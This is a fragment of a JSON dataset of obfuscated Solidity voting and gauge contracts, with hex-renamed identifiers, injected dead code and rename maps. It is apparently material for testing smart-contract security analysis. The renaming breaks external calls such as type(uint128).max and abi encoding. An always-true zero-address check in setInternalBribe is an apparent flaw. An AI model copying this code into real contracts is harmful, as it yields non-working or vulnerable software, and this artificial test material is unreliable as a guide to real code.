_0x16cb54;\n    }\n\n    /* -----------------------------------------------------------------------------\n    --------------------------------------------------------------------------------\n    --------------------------------------------------------------------------------\n                                    USER INTERACTION\n    --------------------------------------------------------------------------------\n    --------------------------------------------------------------------------------\n    ----------------------------------------------------------------------------- */\n\n    /// @notice Reset the votes of a given TokenID\n    function _0xcbcc70(uint256 _0x4f1493) external _0x91113d(_0x4f1493) _0xe31120 {\n        require(IVotingEscrow(_0xfbbd60)._0x3c6757(msg.sender, _0x4f1493), \"NAO\");\n        _0xd8099d(_0x4f1493);\n        IVotingEscrow(_0xfbbd60)._0x9ce9bf(_0x4f1493);\n    }\n\n    function _0xd8099d(uint256 _0x4f1493) internal {\n        address[] storage _0xb574ca = _0x6c24b0[_0x4f1493];\n        uint256 _0x1cffd1 = _0xb574ca.length;\n        uint256 _0x5ef34a = 0;\n\n        for (uint256 i = 0; i < _0x1cffd1; i ++) {\n            address _0xafca99 = _0xb574ca[i];\n            uint256 _0xdb36d0 = _0xf3958f[_0x4f1493][_0xafca99];\n\n            if (_0xdb36d0 != 0) {\n                _0x5fe09b[_0xafca99] -= _0xdb36d0;\n\n                _0xf3958f[_0x4f1493][_0xafca99] -= _0xdb36d0;\n                address _0x2c93bc = _0x088665._0xd21a2f(_0xafca99);\n                address _0x1bfd68 = _0x088665._0x91fb22(_0xafca99);\n                IBribe(_0x2c93bc)._0xe450d1(uint256(_0xdb36d0), _0x4f1493);\n                IBribe(_0x1bfd68)._0xe450d1(uint256(_0xdb36d0), _0x4f1493);\n\n                // decrease totalWeight irrespective of gauge is killed/alive for this current pool\n                _0x5ef34a += _0xdb36d0;\n\n                emit Abstained(_0x4f1493, _0xdb36d0);\n            }\n        }\n        _0x739568 -= _0x5ef34a;\n        _0x059050[_0x4f1493] = 0;\n        delete _0x6c24b0[_0x4f1493];\n    }\n\n    /// @notice Recast the saved votes of a given TokenID\n    function _0x3dda9c(uint256 _0x4f1493) external _0xe31120 {\n        uint256 _0x65cab4 = block.timestamp;\n        if (_0x65cab4 <= HybraTimeLibrary._0x597f9c(_0x65cab4)){\n            revert(\"DW\");\n        }\n        require(IVotingEscrow(_0xfbbd60)._0x3c6757(msg.sender, _0x4f1493) || msg.sender == _0xfbbd60, \"NAO||VE\");\n        address[] memory _0xb574ca = _0x6c24b0[_0x4f1493];\n        uint256 _0x12d8ae = _0xb574ca.length;\n        uint256[] memory _0x32d7ee = new uint256[](_0x12d8ae);\n\n        for (uint256 i = 0; i < _0x12d8ae; i ++) {\n            _0x32d7ee[i] = _0xf3958f[_0x4f1493][_0xb574ca[i]];\n        }\n\n        _0x5a6a8f(_0x4f1493, _0xb574ca, _0x32d7ee);\n    }\n\n    /// @notice Vote for pools\n    /// @param  _tokenId    veNFT tokenID used to vote\n    /// @param  _poolVote   array of LPs addresses to vote  (eg.: [sAMM usdc-usdt   , sAMM busd-usdt, vAMM wbnb-the ,...])\n    /// @param  _weights    array of weights for each LPs   (eg.: [10               , 90            , 45             ,...])\n    function _0x72abc9(uint256 _0x4f1493, address[] calldata _0xb574ca, uint256[] calldata _0x32d7ee)\n        external _0x91113d(_0x4f1493) _0xe31120 {\n        require(IVotingEscrow(_0xfbbd60)._0x3c6757(msg.sender, _0x4f1493), \"NAO\");\n        require(_0xb574ca.length == _0x32d7ee.length, \"MISMATCH_LEN\");\n        require(_0xb574ca.length <= _0x1db222, \"EXCEEDS\");\n        uint256 _0x65cab4 = block.timestamp;\n\n        _0x5a6a8f(_0x4f1493, _0xb574ca, _0x32d7ee);\n        _0x8aaad0[_0x4f1493] = HybraTimeLibrary._0xc93a0f(block.timestamp) + 1;\n        _0x7022b6[_0x4f1493] = block.timestamp;\n    }\n\n    function _0x5a6a8f(uint256 _0x4f1493, address[] memory _0xb574ca, uint256[] memory _0x32d7ee) internal {\n        _0xd8099d(_0x4f1493);\n        uint256 _0x12d8ae = _0xb574ca.length;\n        uint256 _0x018a06 = IVotingEscrow(_0xfbbd60)._0xbbb41c(_0x4f1493);\n        uint256 _0x14dd40 = 0;\n        uint256 _0xe421d6 = 0;\n\n        for (uint i = 0; i < _0x12d8ae; i++) {\n\n            if(_0x088665._0x4d7821(_0xb574ca[i])) _0x14dd40 += _0x32d7ee[i];\n        }\n\n        for (uint256 i = 0; i < _0x12d8ae; i++) {\n            address _0xafca99 = _0xb574ca[i];\n\n            if (_0x088665._0x4d7821(_0xafca99)) {\n                uint256 _0x3c6a7c = _0x32d7ee[i] * _0x018a06 / _0x14dd40;\n\n                require(_0xf3958f[_0x4f1493][_0xafca99] == 0, \"ZV\");\n                require(_0x3c6a7c != 0, \"ZV\");\n\n                _0x6c24b0[_0x4f1493].push(_0xafca99);\n                _0x5fe09b[_0xafca99] += _0x3c6a7c;\n\n                _0xf3958f[_0x4f1493][_0xafca99] = _0x3c6a7c;\n                address _0x2c93bc = _0x088665._0xd21a2f(_0xafca99);\n                address _0x1bfd68 = _0x088665._0x91fb22(_0xafca99);\n\n                IBribe(_0x2c93bc)._0x7a899e(uint256(_0x3c6a7c), _0x4f1493);\n                IBribe(_0x1bfd68)._0x7a899e(uint256(_0x3c6a7c), _0x4f1493);\n\n                _0xe421d6 += _0x3c6a7c;\n                emit Voted(msg.sender, _0x4f1493, _0x3c6a7c);\n            }\n        }\n        if (_0xe421d6 > 0) IVotingEscrow(_0xfbbd60)._0x168098(_0x4f1493);\n        _0x739568 += _0xe421d6;\n        _0x059050[_0x4f1493] = _0xe421d6;\n    }\n\n    modifier _0x91113d(uint256 _0x4f1493) {\n        // ensure new epoch since last vote\n        if (HybraTimeLibrary._0xc93a0f(block.timestamp) <= _0x8aaad0[_0x4f1493]) revert(\"VOTED\");\n        if (block.timestamp <= HybraTimeLibrary._0x597f9c(block.timestamp)) revert(\"DW\");\n        _;\n    }\n\n    /* -----------------------------------------------------------------------------\n    --------------------------------------------------------------------------------\n    --------------------------------------------------------------------------------\n                                    VIEW FUNCTIONS\n    --------------------------------------------------------------------------------\n    --------------------------------------------------------------------------------\n    ----------------------------------------------------------------------------- */\n\n    /// @notice view the total length of the pools\n    function length() external view returns (uint256) {\n        return _0x088665._0xb9666d().length;\n    }\n\n    /// @notice view the total length of the voted pools given a tokenId\n    function _0xe1c15c(uint256 _0xe7db9a) external view returns(uint256) {\n        return _0x6c24b0[_0xe7db9a].length;\n    }\n\n    function _0x93d408(address _0xef561f) external VoterAdmin {\n        require(_0xef561f != address(0));\n        if (gasleft() > 0) { _0x088665 = IGaugeManager(_0xef561f); }\n    }\n\n}",
      "rename_map": {
        "fetchInternalBribeFromPool": "_0xd21a2f",
        "fetchExternalBribeFromPool": "_0x91fb22",
        "setPermissionsRegistry": "_0x55a82a",
        "_permissionRegistry": "_0x96d500",
        "isGaugeAliveForPool": "_0x4d7821",
        "permissionRegistry": "_0x9d9c4d",
        "lastVotedTimestamp": "_0x7022b6",
        "isApprovedOrOwner": "_0x3c6757",
        "_totalVoteWeight": "_0x14dd40",
        "setGaugeManager": "_0x93d408",
        "setMaxVotingNum": "_0x9865e1",
        "internal_bribe": "_0x2c93bc",
        "poolVoteLength": "_0xe1c15c",
        "external_bribe": "_0x1bfd68",
        "epochVoteStart": "_0x597f9c",
        "_tokenHandler": "_0x577ebe",
        "_gaugeManager": "_0xef561f",
        "_maxVotingNum": "_0x16cb54",
        "tokenHandler": "_0xce4fcd",
        "gaugeManager": "_0x088665",
        "balanceOfNFT": "_0xbbb41c",
        "_totalWeight": "_0x5ef34a",
        "onlyNewEpoch": "_0x91113d",
        "nonReentrant": "_0xe31120",
        "maxVotingNum": "_0x1db222",
        "_poolVoteCnt": "_0x1cffd1",
        "_poolWeight": "_0x3c6a7c",
        "initializer": "_0xf1dbe6",
        "usedWeights": "_0x059050",
        "totalWeight": "_0x739568",
        "_usedWeight": "_0xe421d6",
        "initialize": "_0x0368aa",
        "_timestamp": "_0x65cab4",
        "epochStart": "_0xc93a0f",
        "_poolVote": "_0xb574ca",
        "lastVoted": "_0x8aaad0",
        "poolVote": "_0x6c24b0",
        "_poolCnt": "_0x12d8ae",
        "withdraw": "_0xe450d1",
        "_tokenId": "_0x4f1493",
        "_weights": "_0x32d7ee",
        "weights": "_0x5fe09b",
        "hasRole": "_0x1e7f0c",
        "abstain": "_0x9ce9bf",
        "deposit": "_0x7a899e",
        "tokenId": "_0xe7db9a",
        "_weight": "_0x018a06",
        "_reset": "_0xd8099d",
        "latest": "_0xa45a07",
        "_votes": "_0xdb36d0",
        "voting": "_0x168098",
        "weight": "_0x34aa08",
        "token": "_0xd2941f",
        "reset": "_0xcbcc70",
        "pools": "_0xb9666d",
        "votes": "_0xf3958f",
        "_pool": "_0xafca99",
        "voter": "_0x1431b2",
        "_vote": "_0x5a6a8f",
        "base": "_0x576e20",
        "vote": "_0x72abc9",
        "poke": "_0x3dda9c",
        "_ve": "_0xfbbd60",
        "old": "_0x007e8e"
      },
      "changes": [
        "Renamed 64 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_006",
      "transformed_id": "ss_l4_medium_sn_gs_006",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity 0.8.13;\n\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/utils/structs/EnumerableSet.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\";\n import \"@openzeppelin/contracts/utils/math/SafeCast.sol\";\nimport '../interfaces/IGaugeFactoryCL.sol';\nimport '../interfaces/IGaugeManager.sol';\nimport './interface/ICLPool.sol';\nimport './interface/ICLFactory.sol';\nimport './interface/INonfungiblePositionManager.sol';\nimport '../interfaces/IBribe.sol';\nimport '../interfaces/IRHYBR.sol';\nimport {HybraTimeLibrary} from \"../libraries/HybraTimeLibrary.sol\";\nimport {FullMath} from \"./libraries/FullMath.sol\";\nimport {FixedPoint128} from \"./libraries/FixedPoint128.sol\";\nimport '../interfaces/IRHYBR.sol';\n\ncontract GaugeCL is ReentrancyGuard, Ownable, IERC721Receiver {\n\n    using SafeERC20 for IERC20;\n    using EnumerableSet for EnumerableSet.UintSet;\n    using SafeCast for uint128;\n    IERC20 public immutable _0xa130e7;\n    address public immutable _0x982662;\n    address public VE;\n    address public DISTRIBUTION;\n    address public _0xb741b5;\n    address public _0x1d20bc;\n\n    uint256 public DURATION;\n    uint256 internal _0x68aaf0;\n    uint256 public _0xfabb08;\n    ICLPool public _0x65fc91;\n    address public _0x47a4eb;\n    INonfungiblePositionManager public _0xa7c4e3;\n\n    bool public _0xe5ada5;\n    bool public immutable _0xa45730;\n    address immutable _0xde74c8;\n\n    mapping(uint256 => uint256) public  _0x936e7a; // epoch => reward rate\n    mapping(address => EnumerableSet.UintSet) internal _0x9d77c8;\n    mapping(uint256 => uint256) public  _0xc6805f;\n\n    mapping(uint256 => uint256) public  _0xea287e;\n\n    mapping(uint256 => uint256) public  _0xa97e14;\n\n    event RewardAdded(uint256 _0x15da0c);\n    event Deposit(address indexed _0x6c1d77, uint256 _0x723a00);\n    event Withdraw(address indexed _0x6c1d77, uint256 _0x723a00);\n    event Harvest(address indexed _0x6c1d77, uint256 _0x15da0c);\n    event ClaimFees(address indexed from, uint256 _0xe3d1d8, uint256 _0x4c83ed);\n    event EmergencyActivated(address indexed _0x328c0a, uint256 timestamp);\n    event EmergencyDeactivated(address indexed _0x328c0a, uint256 timestamp);\n\n    constructor(address _0xb78e77, address _0xd0143e, address _0xeaeff3, address _0x06a388, address _0x2e214e, address _0x9dc980,\n        address _0x9f2cce, bool _0x6c768f, address _0x73b8b4,  address _0xc487f3) {\n        _0xde74c8 = _0xc487f3;\n        _0xa130e7 = IERC20(_0xb78e77);     // main reward\n        _0x982662 = _0xd0143e;\n        VE = _0xeaeff3;                               // vested\n        _0x47a4eb = _0x06a388;\n        _0x65fc91 = ICLPool(_0x06a388);\n        DISTRIBUTION = _0x2e214e;           // distro address (GaugeManager)\n        DURATION = HybraTimeLibrary.WEEK;\n\n        _0xb741b5 = _0x9dc980;       // lp fees goes here\n        _0x1d20bc = _0x9f2cce;       // bribe fees goes here\n        _0xa45730 = _0x6c768f;\n        _0xa7c4e3 = INonfungiblePositionManager(_0x73b8b4);\n        _0xe5ada5 = false;\n    }\n\n    modifier _0x9489ca() {\n        require(msg.sender == DISTRIBUTION, \"Caller is not RewardsDistribution contract\");\n        _;\n    }\n\n    modifier _0x8df9f5() {\n        require(_0xe5ada5 == false, \"emergency\");\n        _;\n    }\n\n    function _0x2faa18(uint256 _0x12f34e, int24 _0xa91acc, int24 _0x8864a5) internal {\n        uint256 _unused1 = 0;\n        // Placeholder for future logic\n        if (_0xa97e14[_0x12f34e] == block.timestamp) return;\n        _0x65fc91._0x407c2d();\n        _0xa97e14[_0x12f34e] = block.timestamp;\n        _0xea287e[_0x12f34e] += _0xffd439(_0x12f34e);\n        _0xc6805f[_0x12f34e] = _0x65fc91._0x58a946(_0xa91acc, _0x8864a5, 0);\n    }\n\n    function _0x7abc8d() external _0x0163df {\n        // Placeholder for future logic\n        if (false) { revert(); }\n        require(_0xe5ada5 == false, \"emergency\");\n        _0xe5ada5 = true;\n        emit EmergencyActivated(address(this), block.timestamp);\n    }\n\n    function _0x178b40() external _0x0163df {\n\n        require(_0xe5ada5 == true,\"emergency\");\n\n        _0xe5ada5 = false;\n        emit EmergencyDeactivated(address(this), block.timestamp);\n    }\n\n    function _0xee9316(uint256 _0x12f34e) external view returns (uint256) {\n        (,,,,,,,uint128 _0xe7072e,,,,) = _0xa7c4e3._0x743bda(_0x12f34e);\n        return _0xe7072e;\n    }\n\n    function _0x55d5e5(address _0x806181, address _0x8813d2, int24 _0x0bc9e4) internal view returns (address) {\n        return ICLFactory(_0xa7c4e3._0xde74c8())._0x9210aa(_0x806181, _0x8813d2, _0x0bc9e4);\n    }\n\n    function _0x7948fa(uint256 _0x12f34e) external view returns (uint256 _0x15da0c) {\n        require(_0x9d77c8[msg.sender]._0x936e09(_0x12f34e), \"NA\");\n\n        uint256 _0x15da0c = _0xffd439(_0x12f34e);\n        return (_0x15da0c); // bonsReward is 0 for now\n    }\n\n       function _0xffd439(uint256 _0x12f34e) internal view returns (uint256) {\n        uint256 _0x2c196c = _0x65fc91._0x2c196c();\n\n        uint256 _0xdac061 = block.timestamp - _0x2c196c;\n\n        uint256 _0x648c30 = _0x65fc91._0x648c30();\n        uint256 _0xa4baef = _0x65fc91._0xa4baef();\n\n        if (_0xdac061 != 0 && _0xa4baef > 0 && _0x65fc91._0x1e2278() > 0) {\n            uint256 _0x15da0c = _0xfabb08 * _0xdac061;\n            if (_0x15da0c > _0xa4baef) _0x15da0c = _0xa4baef;\n\n            _0x648c30 += FullMath._0x5d90a0(_0x15da0c, FixedPoint128.Q128, _0x65fc91._0x1e2278());\n        }\n\n        (,,,,, int24 _0xa91acc, int24 _0x8864a5, uint128 _0xe7072e,,,,) = _0xa7c4e3._0x743bda(_0x12f34e);\n\n        uint256 _0x721766 = _0xc6805f[_0x12f34e];\n        uint256 _0x3c01ac = _0x65fc91._0x58a946(_0xa91acc, _0x8864a5, _0x648c30);\n\n        uint256 _0xa73953 =\n            FullMath._0x5d90a0(_0x3c01ac - _0x721766, _0xe7072e, FixedPoint128.Q128);\n        return _0xa73953;\n    }\n\n    function _0x6334bc(uint256 _0x12f34e) external _0x22bb2f _0x8df9f5 {\n\n         (,,address _0x806181, address _0x8813d2, int24 _0x0bc9e4, int24 _0xa91acc, int24 _0x8864a5, uint128 _0xe7072e,,,,) =\n            _0xa7c4e3._0x743bda(_0x12f34e);\n\n        require(_0xe7072e > 0, \"Gauge: zero liquidity\");\n        // Calculate pool address from position parameters\n        address _0x2ced1f = _0x55d5e5(_0x806181, _0x8813d2, _0x0bc9e4);\n        // Verify that the position's pool matches this gauge's pool\n        require(_0x2ced1f == _0x47a4eb, \"Pool mismatch: Position not for this gauge pool\");\n        // collect fees\n        _0xa7c4e3._0x8356ad(INonfungiblePositionManager.CollectParams({\n                _0x12f34e: _0x12f34e,\n                _0x273cf6: msg.sender,\n                _0x6c6d10: type(uint128)._0xc52d39,\n                _0xcf314a: type(uint128)._0xc52d39\n            }));\n\n        _0xa7c4e3._0x8b0120(msg.sender, address(this), _0x12f34e);\n\n        _0x65fc91._0x5436eb(int128(_0xe7072e), _0xa91acc, _0x8864a5, true);\n\n        uint256 _0x648ff9 = _0x65fc91._0x58a946(_0xa91acc, _0x8864a5, 0);\n        _0xc6805f[_0x12f34e] = _0x648ff9;\n        _0xa97e14[_0x12f34e] = block.timestamp;\n\n        _0x9d77c8[msg.sender]._0x3098f0(_0x12f34e);\n\n        emit Deposit(msg.sender, _0x12f34e);\n    }\n\n    function _0x1bb202(uint256 _0x12f34e, uint8 _0xcae473) external _0x22bb2f _0x8df9f5 {\n           require(_0x9d77c8[msg.sender]._0x936e09(_0x12f34e), \"NA\");\n\n        // trigger update on staked position so NFT will be in sync with the pool\n        _0xa7c4e3._0x8356ad(\n            INonfungiblePositionManager.CollectParams({\n                _0x12f34e: _0x12f34e,\n                _0x273cf6: msg.sender,\n                _0x6c6d10: type(uint128)._0xc52d39,\n                _0xcf314a: type(uint128)._0xc52d39\n            })\n        );\n\n        (,,,,, int24 _0xa91acc, int24 _0x8864a5, uint128 _0x2ebdd3,,,,) = _0xa7c4e3._0x743bda(_0x12f34e);\n        _0x2d42c8(_0xa91acc, _0x8864a5, _0x12f34e, msg.sender, _0xcae473);\n\n        // update virtual liquidity in pool only if token has existing liquidity\n        // i.e. not all removed already via decreaseStakedLiquidity\n        if (_0x2ebdd3 != 0) {\n            _0x65fc91._0x5436eb(-int128(_0x2ebdd3), _0xa91acc, _0x8864a5, true);\n        }\n\n        _0x9d77c8[msg.sender]._0x9034aa(_0x12f34e);\n        _0xa7c4e3._0x8b0120(address(this), msg.sender, _0x12f34e);\n\n        emit Withdraw(msg.sender, _0x12f34e);\n    }\n\n    function _0x61556d(uint256 _0x12f34e, address _0xfcb3a3,uint8 _0xcae473 ) public _0x22bb2f _0x9489ca {\n\n        require(_0x9d77c8[_0xfcb3a3]._0x936e09(_0x12f34e), \"NA\");\n\n        (,,,,, int24 _0xa91acc, int24 _0x8864a5,,,,,) = _0xa7c4e3._0x743bda(_0x12f34e);\n        _0x2d42c8(_0xa91acc, _0x8864a5, _0x12f34e, _0xfcb3a3, _0xcae473);\n    }\n\n    function _0x2d42c8(int24 _0xa91acc, int24 _0x8864a5, uint256 _0x12f34e,address _0xfcb3a3, uint8 _0xcae473) internal {\n        _0x2faa18(_0x12f34e, _0xa91acc, _0x8864a5);\n        uint256 _0x31abbb = _0xea287e[_0x12f34e];\n        if(_0x31abbb > 0){\n            delete _0xea287e[_0x12f34e];\n            _0xa130e7._0x67f8de(_0x982662, _0x31abbb);\n            IRHYBR(_0x982662)._0x50e52e(_0x31abbb);\n            IRHYBR(_0x982662)._0x32a10f(_0x31abbb, _0xcae473, _0xfcb3a3);\n        }\n        emit Harvest(msg.sender, _0x31abbb);\n    }\n\n    function _0x7f91c3(address _0xec7ce7, uint256 _0x31abbb) external _0x22bb2f\n        _0x8df9f5 _0x9489ca returns (uint256 _0x81744a) {\n        require(_0xec7ce7 == address(_0xa130e7), \"Invalid reward token\");\n\n        // Update global reward growth before processing new rewards\n        _0x65fc91._0x407c2d();\n\n        // Calculate time remaining until next epoch begins\n        uint256 _0x6ada96 = HybraTimeLibrary._0x08c1c1(block.timestamp) - block.timestamp;\n        uint256 _0x920a3e = block.timestamp + _0x6ada96;\n\n        // Include any rolled over rewards from previous period\n        uint256 _0x6365d2 = _0x31abbb + _0x65fc91._0x52f2f3();\n\n        // Check if we are starting a new reward period or continuing existing one\n        if (block.timestamp >= _0x68aaf0) {\n            // New period: distribute rewards over remaining epoch time\n            _0xfabb08 = _0x31abbb / _0x6ada96;\n            _0x65fc91._0x19dea7({\n                _0xfabb08: _0xfabb08,\n                _0xa4baef: _0x6365d2,\n                _0xc13c41: _0x920a3e\n            });\n        } else {\n            // Existing period: add new rewards to pending distribution\n            uint256 _0x513c73 = _0x6ada96 * _0xfabb08;\n            _0xfabb08 = (_0x31abbb + _0x513c73) / _0x6ada96;\n            _0x65fc91._0x19dea7({\n                _0xfabb08: _0xfabb08,\n                _0xa4baef: _0x6365d2 + _0x513c73,\n                _0xc13c41: _0x920a3e\n            });\n        }\n\n        // Store reward rate for current epoch tracking\n        _0x936e7a[HybraTimeLibrary._0x54d613(block.timestamp)] = _0xfabb08;\n\n        // Transfer reward tokens from distributor to gauge\n        _0xa130e7._0x8b0120(DISTRIBUTION, address(this), _0x31abbb);\n\n        // Verify contract has sufficient balance to support calculated reward rate\n        uint256 _0x7d6db1 = _0xa130e7._0xee9316(address(this));\n        require(_0xfabb08 <= _0x7d6db1 / _0x6ada96, \"Insufficient balance for reward rate\");\n\n        // Update period finish time and return current rate\n        _0x68aaf0 = _0x920a3e;\n        _0x81744a = _0xfabb08;\n\n        emit RewardAdded(_0x31abbb);\n    }\n\n    function _0x9317f1() external view returns (uint256 _0x806181, uint256 _0x8813d2){\n\n        (_0x806181, _0x8813d2) = _0x65fc91._0x7d1e8a();\n\n    }\n\n    function _0xd11abe() external _0x22bb2f returns (uint256 _0xe3d1d8, uint256 _0x4c83ed) {\n        return _0x3c292e();\n    }\n\n    function _0x3c292e() internal returns (uint256 _0xe3d1d8, uint256 _0x4c83ed) {\n        if (!_0xa45730) {\n            return (0, 0);\n        }\n\n        _0x65fc91._0xf93ceb();\n\n        address _0xd58a6b = _0x65fc91._0x806181();\n        address _0xadf079 = _0x65fc91._0x8813d2();\n        // Fetch fee from the whole epoch which just eneded and transfer it to internal Bribe address.\n        _0xe3d1d8 = IERC20(_0xd58a6b)._0xee9316(address(this));\n        _0x4c83ed = IERC20(_0xadf079)._0xee9316(address(this));\n\n        if (_0xe3d1d8 > 0 || _0x4c83ed > 0) {\n\n            uint256 _0xe01c88 = _0xe3d1d8;\n            uint256 _0x85cdcb = _0x4c83ed;\n\n            if (_0xe01c88  > 0) {\n                IERC20(_0xd58a6b)._0x67f8de(_0xb741b5, 0);\n                IERC20(_0xd58a6b)._0x67f8de(_0xb741b5, _0xe01c88);\n                IBribe(_0xb741b5)._0x7f91c3(_0xd58a6b, _0xe01c88);\n            }\n            if (_0x85cdcb  > 0) {\n                IERC20(_0xadf079)._0x67f8de(_0xb741b5, 0);\n                IERC20(_0xadf079)._0x67f8de(_0xb741b5, _0x85cdcb);\n                IBribe(_0xb741b5)._0x7f91c3(_0xadf079, _0x85cdcb);\n            }\n            emit ClaimFees(msg.sender, _0xe3d1d8, _0x4c83ed);\n        }\n    }\n\n    ///@notice get total reward for the duration\n    function _0xee70e0() external view returns (uint256) {\n        return _0xfabb08 * DURATION;\n    }\n\n    ///@notice set new internal bribe contract (where to send fees)\n    function _0x6200fd(address _0xe92c8d) external _0x0163df {\n        require(_0xe92c8d >= address(0), \"zero\");\n        _0xb741b5 = _0xe92c8d;\n    }\n\n    function _0xe57db1(address _0xec7ce7,address _0x776775,uint256 value) internal {\n        require(_0xec7ce7.code.length > 0);\n        (bool _0x98e40b, bytes memory data) = _0xec7ce7.call(abi._0x727601(IERC20.transfer.selector, _0x776775, value));\n        require(_0x98e40b && (data.length == 0 || abi._0xeceaff(data, (bool))));\n    }\n\n    /**\n     * @dev Handle the receipt of an NFT\n     * @param operator The address which called `safeTransferFrom` function\n     * @param from The address which previously owned the token\n     * @param tokenId The NFT identifier which is being transferred\n     * @param data Additional data with no specified format\n     * @return bytes4 `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))`\n     */\n    function _0x7d3fc0(\n        address _0x7c2498,\n        address from,\n        uint256 _0x12f34e,\n        bytes calldata data\n    ) external pure override returns (bytes4) {\n        return IERC721Receiver._0x7d3fc0.selector;\n    }\n\n}\n\n",
      "rename_map": {
        "rewardPerTokenInsideInitialX128": "_0x721766",
        "nonfungiblePositionManager": "_0xa7c4e3",
        "updateRewardsGrowthGlobal": "_0x407c2d",
        "rewardPerTokenInsideX128": "_0x3c01ac",
        "depostionEmissionsToken": "_0x50e52e",
        "rewardGrowthGlobalX128": "_0x648c30",
        "getRewardGrowthInside": "_0x58a946",
        "activateEmergencyMode": "_0x7abc8d",
        "epochTimeRemaining": "_0x6ada96",
        "encodeWithSelector": "_0x727601",
        "rewardGrowthInside": "_0xc6805f",
        "notifyRewardAmount": "_0x7f91c3",
        "rewardRateByEpoch": "_0x936e7a",
        "stopEmergencyMode": "_0x178b40",
        "rewardForDuration": "_0xee70e0",
        "totalRewardAmount": "_0x6365d2",
        "epochEndTimestamp": "_0x920a3e",
        "onlyDistribution": "_0x9489ca",
        "safeTransferFrom": "_0x8b0120",
        "setInternalBribe": "_0x6200fd",
        "liquidityToStake": "_0x2ebdd3",
        "onERC721Received": "_0x7d3fc0",
        "contractBalance": "_0x7d6db1",
        "_getPoolAddress": "_0x55d5e5",
        "_external_bribe": "_0x9f2cce",
        "_internal_bribe": "_0x9dc980",
        "stakedLiquidity": "_0x1e2278",
        "isNotEmergency": "_0x8df9f5",
        "pendingRewards": "_0x513c73",
        "_updateRewards": "_0x2faa18",
        "lastUpdateTime": "_0xa97e14",
        "internal_bribe": "_0xb741b5",
        "external_bribe": "_0x1d20bc",
        "_periodFinish": "_0x68aaf0",
        "_safeTransfer": "_0xe57db1",
        "_distribution": "_0x2e214e",
        "gaugeBalances": "_0x9317f1",
        "rewardReserve": "_0xa4baef",
        "periodFinish": "_0xc13c41",
        "nonReentrant": "_0x22bb2f",
        "rewardGrowth": "_0x648ff9",
        "positionPool": "_0x2ced1f",
        "rewardAmount": "_0x31abbb",
        "_rewardToken": "_0xb78e77",
        "collectFees": "_0xf93ceb",
        "lastUpdated": "_0x2c196c",
        "poolAddress": "_0x47a4eb",
        "currentRate": "_0x81744a",
        "safeApprove": "_0x67f8de",
        "rewardToken": "_0xa130e7",
        "tickSpacing": "_0x0bc9e4",
        "amount1Max": "_0xcf314a",
        "_isForPair": "_0x6c768f",
        "_claimFees": "_0x3c292e",
        "rewardRate": "_0xfabb08",
        "syncReward": "_0x19dea7",
        "amount0Max": "_0x6c6d10",
        "epochStart": "_0x54d613",
        "_getReward": "_0x2d42c8",
        "redeemType": "_0xcae473",
        "epochNext": "_0x08c1c1",
        "onlyOwner": "_0x0163df",
        "liquidity": "_0xe7072e",
        "balanceOf": "_0xee9316",
        "getReward": "_0x61556d",
        "positions": "_0x743bda",
        "emergency": "_0xe5ada5",
        "gaugeFees": "_0x7d1e8a",
        "tickLower": "_0xa91acc",
        "claimable": "_0xa73953",
        "timeDelta": "_0xdac061",
        "redeemFor": "_0x32a10f",
        "isForPair": "_0xa45730",
        "recipient": "_0x273cf6",
        "tickUpper": "_0x8864a5",
        "claimFees": "_0xd11abe",
        "contains": "_0x936e09",
        "_factory": "_0xc487f3",
        "claimed0": "_0xe3d1d8",
        "withdraw": "_0x1bb202",
        "operator": "_0x7c2498",
        "claimed1": "_0x4c83ed",
        "rollover": "_0x52f2f3",
        "rewards": "_0xea287e",
        "_stakes": "_0x9d77c8",
        "tokenId": "_0x12f34e",
        "_token1": "_0xadf079",
        "collect": "_0x8356ad",
        "getPool": "_0x9210aa",
        "deposit": "_0x6334bc",
        "factory": "_0xde74c8",
        "_earned": "_0xffd439",
        "_token0": "_0xd58a6b",
        "account": "_0xfcb3a3",
        "success": "_0x98e40b",
        "clPool": "_0x65fc91",
        "_fees1": "_0x85cdcb",
        "decode": "_0xeceaff",
        "mulDiv": "_0x5d90a0",
        "reward": "_0x15da0c",
        "_rHYBR": "_0xd0143e",
        "_fees0": "_0xe01c88",
        "earned": "_0x7948fa",
        "remove": "_0x9034aa",
        "amount": "_0x723a00",
        "token0": "_0x806181",
        "token1": "_0x8813d2",
        "_pool": "_0x06a388",
        "rHYBR": "_0x982662",
        "stake": "_0x5436eb",
        "token": "_0xec7ce7",
        "gauge": "_0x328c0a",
        "_int": "_0xe92c8d",
        "nfpm": "_0x73b8b4",
        "user": "_0x6c1d77",
        "max": "_0xc52d39",
        "add": "_0x3098f0",
        "_ve": "_0xeaeff3",
        "to": "_0x776775"
      },
      "changes": [
        "Renamed 119 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_007",
      "transformed_id": "ss_l4_medium_sn_gs_007",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
